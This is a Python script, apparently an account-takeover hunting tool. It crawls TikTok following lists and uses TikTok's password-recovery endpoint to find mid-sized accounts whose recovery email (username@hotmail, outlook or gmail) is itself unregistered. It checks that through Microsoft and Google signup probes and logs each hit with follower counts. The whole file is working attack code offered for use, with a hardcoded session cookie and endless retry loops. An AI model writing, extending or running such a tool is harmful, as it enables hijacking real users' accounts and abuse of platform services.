import datetime
import random
import requests
import json
import threading
import sys

_reqid = 104685
max_time = 0
iid = random.randint(1000000000000000000, 9999999999999999999)

def tiktok_timestamp(create_time):
    return datetime.datetime.fromtimestamp(create_time).date()

def email_lookup(email, provider, tld):
    while True:
        try:
            url = f'https://api31-normal-useast1a.tiktokv.com/aweme/v1/passport/find-password-via-email/?email={email}@{provider}.{tld}'
            headers = {
                "Host": "api31-normal-useast1a.tiktokv.com",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.10.0.1"
            }
            return requests.post(url, headers=headers).json()
        except:
            continue

def check_gmail_availability(user):
    global _reqid
    url = f"https://accounts.google.com/_/signup/webusernameavailability?hl=de&_reqid={_reqid}&rt=j"
    payload = f"continue=https%3A%2F%2Faccounts.google.com%2F&f.req=%5B%22AEThLlxPKEd52jCrENP5m0NnOsYjctv71rHQDUESXJUBVRReFW_u5SmLIWre404RwEV1QzARZ-3ax-N68NQ_iHZRyc0PmXd2fNF7ZTe5cMsC6h8NgQELj_YD0yS_W0ENj0iUMKrqpOkQBIsK6vcfQ8t8cJjI8kpwgDUvWSulexgpcCOyGdb8rjas2uaE2IJ6MGTX9HumJgwjQ3wXlyhqPdmDny_FSzfYeg%22%2C%22%22%2C%22%22%2C%22{user}%22%2Ctrue%2C%22S-1778149835%3A1662247044906038%22%2C1%5D&azt=AFoagUVFn7WuT2s6x_GGlfeeF_9NB_yqEA%3A1662247044923&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C%22DE%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2Cfalse%2C1%2C%22%22%5D&gmscoreversion=undefined&"
    headers = {
        "authority": "accounts.google.com",
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
        "origin": "https://accounts.google.com",
        "referer": "https://accounts.google.com/signup/v2/webcreateaccount?continue=https%3A%2F%2Faccounts.google.com%2F&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
    }
    response = requests.post(url, headers=headers, data=payload)
    data = json.loads(response.text[4:])
    _reqid += 100000
    return data[0][0][1]

def microsoft_lookup(user, domain):
    while True:
        try:
            url = f"https://odc.officeapps.live.com/odc/v2.1/idp?hm=0&emailAddress={user}@{domain}.com&idp=live"
            headers = {
                "Host": "odc.officeapps.live.com",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro Build/SP2A.220405.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36",
                "referer": f"https://odc.officeapps.live.com/odc/v2.1/hrd?email={user}@{domain}.com&idp=live&app=145&Ver=4.2220.1&p=4&fpEnabled=1&autosubmit=true&rs=en"
            }
            return requests.get(url, headers=headers).json()["account"]
        except:
            continue

def check_user(user, now):
    with open("checked.txt", "r") as file:
        if user["unique_id"] not in file.read():
            valid_conditions = (
                user["is_star"] == False and user["verification_type"] == 1 and
                not user["custom_verify"] and not user["enterprise_verify_reason"] and
                not user["nickname"].startswith((".", "_")) and not user["nickname"].endswith(".") and
                ".." not in user["nickname"] and not user["unique_id"][0].isdigit() and
                user["unique_id"] in user["nickname"] and len(user["nickname"]) > 5 and
                9999 < user["follower_count"] < 400000 and user["unique_id_modify_time"] == int(now)
            )
            if valid_conditions:
                check_email(user, now)

def check_email(user, now):
    for provider, domain in [("hotmail", "com"), ("outlook", "com"), ("gmail", "com")]:
        email_status = email_lookup(user["unique_id"], provider, domain)
        if email_status["status_code"] == 0:
            if provider == "gmail" and "_" not in user["nickname"] and check_gmail_availability(user["unique_id"]) == 1:
                save_user_info(user, provider)
            elif provider != "gmail" and microsoft_lookup(user["unique_id"], provider) == "Neither":
                save_user_info(user, provider)

def save_user_info(user, provider):
    email = f'{user["unique_id"]}@{provider}.com'
    print(email)
    with open("checked.txt", "a") as file:
        file.write(f'Email: {email} | Username: {user["unique_id"]} | Followers: {user["follower_count"]} | Likes: {user["total_favorited"]} | Created: {tiktok_timestamp(user["create_time"])}\n')

user_id = sys.argv[1]

while True:
    try:
        url = f"https://api-h2.tiktokv.com/aweme/v1/user/following/list/?user_id={user_id}&max_time={max_time}&count=20&iid={iid}&channel=googleplay&device_type=Mi+9T&os_version=11&version_code=190103&app_name=trill&device_platform=android&aid=1180"
        headers = {
            "Host": "api-h2.tiktokv.com",
            "accept-encoding": "gzip",
            "cookie": "sessionid=8893480e224e7f69f0cc42c18b8ce99a",
            "user-agent": "okhttp/3.10.0.1"
        }
        response = requests.get(url, headers=headers).json()
        
        if "followings" not in response or not response["followings"]:
            break

        now = str(response["extra"]["now"])[:-3]

        if response.get("has_more", False):
            max_time = response["min_time"]
        else:
            for user in response["followings"]:
                threading.Thread(target=check_user, args=(user, now)).start()
            break

        for user in response["followings"]:
            threading.Thread(target=check_user, args=(user, now)).start()
    except:
        continue

# made by https://github.com/d33dd33d